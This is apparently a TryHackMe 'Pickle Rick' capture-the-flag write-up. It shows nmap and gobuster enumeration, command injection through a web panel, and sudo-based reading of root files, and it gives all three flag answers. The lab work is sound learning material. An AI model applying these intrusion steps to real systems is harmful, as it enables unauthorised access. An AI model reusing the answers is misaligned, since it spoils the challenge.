# 🥒 TryHackMe - Pickle Rick

**Platform:** TryHackMe  
**Challenge Type:** Boot2Root  
**Author:** Gage Ayala ([@GageGotya](https://github.com/GageGotya))  
**Date:** April 11, 2025  
**Difficulty:** ⭐ Easy  

---

## 📘 Overview

This Rick and Morty-themed room tasks you with helping Rick transform back from a pickle into a human by collecting three secret ingredients.  
You'll perform enumeration, exploit command injection, and escalate privileges to recover all ingredients and save Rick.

> 💡 A fun and clever room that introduces web fuzzing, command injection, and Linux privilege escalation.

---

## 🌐 Information Gathering

**Target IP:** _Provided by the room_

### 🔍 Nmap Scan

```bash
nmap -sC -sV <target-ip>
```

**Discovered Service:**

- HTTP on port 80 — `/assets` endpoint present

---

## 🧑‍💻 Web Exploration

### 🧪 robots.txt

```text
/Wubbalubbadubdub
```

### 🔍 Page Source

Found credential clue in home page source code:

```text
Username: RickRul3s
```

---

## 🪜 Directory Enumeration

### Using Gobuster

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

- Discovered hidden PHP pages and directories
- Found login page for user access

---

## 🔐 Logging In

Used credentials:

- **Username:** `RickRul3s`  
- **Password:** *(attempts based on clues; successful login leads to web command panel)*

---

## 💉 Command Injection

The panel allows basic command injection. Used it to:

```bash
ls
cat clue.txt
```

Discovered hint and directories leading to first ingredient. Realize cat is not usable.

---

## 📄 First Ingredient

Found file and used:

```bash
less clue.txt
```

🧪 **Ingredient 1:** `mr. meeseek hair`

---

## 🔍 Exploring for Second Ingredient

Navigated to Rick’s home:

```bash
cd /home/rick; ls; pwd
less /home/rick/"second ingredients"; ls
```

🧪 **Ingredient 2:** `1 jerry tear`

---

## 🔐 Privilege Escalation

### Checking sudo access:

```bash
sudo -l
```

Found permission to list and read `/root/`:

```bash
sudo ls /root
```

---

## 👑 Final Ingredient

```bash
sudo less /root/3rd.txt
```

🧪 **Ingredient 3:** `fleeb juice`

✅ All three ingredients collected — Rick is no longer a pickle!

---

## 💡 Reflections

- `robots.txt` is always worth checking — hidden paths are treasure maps  
- Command injection is powerful when web input isn’t sanitized  
- Even silly themes teach serious techniques — enumeration, injection, escalation

---

## 🧠 Pro Tip

> *"Always test web forms for input abuse, and never skip over page source — devs hide all sorts of goodies."*

---

## 📁 Summary of Key Files

| File                   | Description                              |
|------------------------|------------------------------------------|
| `robots.txt`           | Hidden directory revealed                |
| `source code`          | Hidden username in comments              |
| `second ingredients`   | File with second ingredient              |
| `/root/3rd.txt`        | Root-only file with final ingredient     |
